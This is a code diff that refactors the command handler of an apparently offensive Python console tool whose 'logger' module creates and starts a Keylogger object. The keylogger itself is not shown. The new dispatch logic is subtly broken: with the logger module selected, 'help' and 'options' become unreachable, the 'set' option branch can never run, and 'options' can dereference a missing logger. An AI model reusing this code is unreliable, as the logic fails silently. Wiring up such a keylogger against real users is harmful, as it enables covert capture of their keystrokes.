@@ -7,6 +7,7 @@ class Handler:
     def __init__(self, args):
         self.args = args
         self.module = ""
+        self.logger = None
 
     def start(self):
         while True:
@@ -14,20 +15,31 @@ class Handler:
             self.handle_command(command)
 
     def handle_command(self, command):
-        if command[0:3] == "USE" or command[0:3] == 'use':
+        if command[0:3] == "USE" or command[0:3] == "use":
             self.module = command[4:]
-        elif command == "help":
-            self.print_help()
-        elif self.module == "logger":
+            return
+
+        if self.module == "logger":
+            if self.logger is None:
                 self.logger = logger.Keylogger(self.args)
-                if command == "start" or command == "run":
-                    self.logger.start()
-                elif command == "options":
-                    cmd_array = command.split(' ')
-                    if len(cmd_array) > 1 and cmd_array[1] == "set":
-                        self.logger.update_options(cmd_array[2], cmd_array[3])
-                    else:
-                        self.logger.print_options()
+            if command == "start" or command == "run":
+                self.logger.start()
+            return
+
+        if command == "help":
+            self.print_help()
+            return
+
+        if command == "options":
+            if self.module == "":
+                print("No module selected")
+                return
+            cmd_array = command.split(' ')
+            if len(cmd_array) > 1 and cmd_array[1] == "set":
+                self.logger.update_options(cmd_array[2], cmd_array[3])
+            else:
+                self.logger.print_options()
+            return
 
     def print_help(self):
         help_payload = ""
